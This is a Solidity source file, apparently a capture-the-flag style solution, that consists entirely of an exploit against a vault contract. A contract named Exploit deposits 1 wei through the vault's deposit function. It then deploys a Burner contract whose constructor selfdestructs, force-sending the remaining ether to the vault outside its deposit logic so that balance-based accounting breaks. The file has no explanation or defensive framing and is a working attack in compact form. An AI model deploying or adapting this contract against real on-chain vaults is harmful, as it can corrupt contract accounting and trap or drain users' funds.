pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Burner {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract Exploit {
    address public target;

    constructor(address t) payable {
        target = t;
    }

    function run() external {
        IVault(target).deposit{value: 1}();
        uint256 rest = address(this).balance;
        new Burner{value: rest}(payable(target));
    }
}
